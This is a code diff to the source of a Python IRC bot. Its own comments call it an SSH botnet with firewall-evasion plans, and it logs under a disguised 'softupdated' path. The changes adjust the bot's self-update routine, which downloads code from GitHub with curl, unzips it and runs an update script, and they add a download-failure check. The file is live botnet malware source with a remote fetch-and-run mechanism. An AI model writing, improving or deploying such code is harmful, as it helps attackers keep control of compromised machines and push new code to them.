@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "6.5"                                                   # bot version
+version = "6.6"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -422,7 +422,7 @@ def run(cmd, public=False, return_to=admin):                                    
 
 def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates the bot by downloading source from github, then running the update.sh script
     log('[*] Starting Selfupdate...')
-    privmsg('[+] Starting Selfupdate...')
+    privmsg('[+] Starting v%s selfupdate...' % version)
 
     privmsg('[#]   Preparing...')
     cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code;"
@@ -431,10 +431,14 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
         privmsg('[>]    %s' % line)
 
     privmsg('[#]   Downloading...')
-    cmd = "curl -f -# https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
+    cmd = "curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
     for line in run_shell(cmd, timeout=60, verbose=True):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
+        if line.find("[X]") != -1:
+            sleep(1)
+            privmsg("[X]   Download failed. Try again later.")
+            return 1
 
     privmsg('[#]   Unzipping...')
     cmd = "unzip -oq /private/var/softupdated/code.zip -d /private/var/softupdated/code"
